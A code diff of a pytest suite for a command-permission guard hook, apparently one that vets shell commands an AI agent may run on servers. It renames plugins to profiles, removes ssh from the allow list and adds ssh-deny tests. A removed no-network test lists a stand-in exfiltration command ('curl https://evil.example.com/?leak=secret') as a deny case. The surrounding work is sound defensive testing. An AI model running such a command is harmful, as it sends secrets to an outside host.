@@ -65,7 +65,6 @@ ALLOW = [
     "tail -n 100 /var/log/app.log",
     "grep -i error app.log",
     "curl -s http://localhost:8080/health",
-    "ssh user@host docker ps",
     "systemctl status nginx",
     "journalctl -u nginx --since today",
     "docker logs --tail 200 web | grep ERROR",
@@ -79,7 +78,6 @@ ALLOW = [
     'curl -m 5 -H "Accept: application/json" http://192.168.1.20:9000/v1/status',
     "curl -s http://web:8080/metrics",
     "curl -s http://[::1]:8500/v1/agent/checks",
-    "ssh -p 2222 -i /home/app/key user@host cat /var/log/app.log",
     "cat /dev/null",
     "uniq -c app.log",
     "journalctl -F _SYSTEMD_UNIT",
@@ -291,11 +289,11 @@ def test_deny(command: str, tmp_path: Path) -> None:
         assert out.get("permissionDecision") == "deny"
 
 
-# --- плагины: выключен = запрещён ---------------------------------------------
+# --- профили: выключен = запрещён ---------------------------------------------
 
 
 @pytest.mark.parametrize(
-    "plugin, command",
+    "profile, command",
     [
         ("docker", "docker ps"),
         ("docker", "docker exec web cat /etc/hosts"),
@@ -304,61 +302,32 @@ def test_deny(command: str, tmp_path: Path) -> None:
         ("redis", "redis-cli INFO"),
         ("rabbitmq", "rabbitmqctl status"),
         ("http", "curl -s http://localhost:8080/health"),
-        ("ssh", "ssh user@host uptime"),
     ],
 )
-def test_plugin_disabled_denies(plugin: str, command: str, tmp_path: Path) -> None:
-    plugins = tmp_path / "plugins.json"
-    plugins.write_text(json.dumps({plugin: False}), encoding="utf-8")
-    env = {"SRV_EXPLORE_PLUGINS": str(plugins)}
+def test_profile_disabled_denies(profile: str, command: str, tmp_path: Path) -> None:
+    state = tmp_path / "profiles.json"
+    state.write_text(json.dumps({profile: False}), encoding="utf-8")
+    env = {"SRV_EXPLORE_PROFILE_STATE": str(state)}
     code, _ = run_guard(command, tmp_path, extra_env=env)
-    assert code == 2, f"выключен плагин {plugin} — должно быть deny: {command}"
+    assert code == 2, f"выключен профиль {profile} — должно быть deny: {command}"
     code, _ = run_guard("df -h", tmp_path, extra_env=env)
-    assert code == 0, "локальные read-команды не зависят от плагинов"
+    assert code == 0, "базовые read-команды не зависят от других профилей"
 
 
-def test_plugins_default_enabled(tmp_path: Path) -> None:
-    env = {"SRV_EXPLORE_PLUGINS": str(tmp_path / "нет_файла.json")}
+def test_profiles_default_enabled(tmp_path: Path) -> None:
+    env = {"SRV_EXPLORE_PROFILE_STATE": str(tmp_path / "нет_файла.json")}
     code, _ = run_guard("docker ps", tmp_path, extra_env=env)
-    assert code == 0, "нет plugins.json — все известные плагины включены"
+    assert code == 0, "нет profiles.json — все профили включены по умолчанию"
 
 
-# --- on-host сервис: egress закрыт (SRV_EXPLORE_NO_NETWORK) ---------------------
-
-NO_NET = {"SRV_EXPLORE_NO_NETWORK": "1"}
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        "curl -s https://api.example.com/health",
-        "curl https://evil.example.com/?leak=secret",
-        "ssh user@host docker ps",
-    ],
-)
-def test_no_network_blocks_curl_and_ssh(command: str, tmp_path: Path) -> None:
-    code, decision = run_guard(command, tmp_path, extra_env=NO_NET)
-    assert code == 2, f"с SRV_EXPLORE_NO_NETWORK должно быть deny: {command}"
-    if decision:
-        assert (
-            decision.get("hookSpecificOutput", {}).get("permissionDecision") == "deny"
-        )
+def test_local_profile_disabled_denies_base(tmp_path: Path) -> None:
+    state = tmp_path / "profiles.json"
+    state.write_text(json.dumps({"shell": False}), encoding="utf-8")
+    env = {"SRV_EXPLORE_PROFILE_STATE": str(state)}
+    code, _ = run_guard("df -h", tmp_path, extra_env=env)
+    assert code == 2, "выключен профиль shell (база) — локальные read тоже deny"
 
 
-@pytest.mark.parametrize(
-    "command",
-    [
-        "df -h",
-        "ls -la /var/log",
-        "cat /var/log/app.log",
-        "journalctl -u nginx --since today",
-        "docker ps -a",
-        'psql -c "SELECT 1"',
-    ],
-)
-def test_no_network_still_allows_local_reads(command: str, tmp_path: Path) -> None:
-    code, decision = run_guard(command, tmp_path, extra_env=NO_NET)
-    assert code == 0, (
-        f"локальное чтение должно оставаться allow даже с NO_NETWORK: {command}"
-    )
-    assert decision.get("hookSpecificOutput", {}).get("permissionDecision") == "allow"
+def test_ssh_denied_no_profile(tmp_path: Path) -> None:
+    code, _ = run_guard("ssh user@host uptime", tmp_path)
+    assert code == 2, "ssh без профиля — deny (профиль ssh не поставляется)"
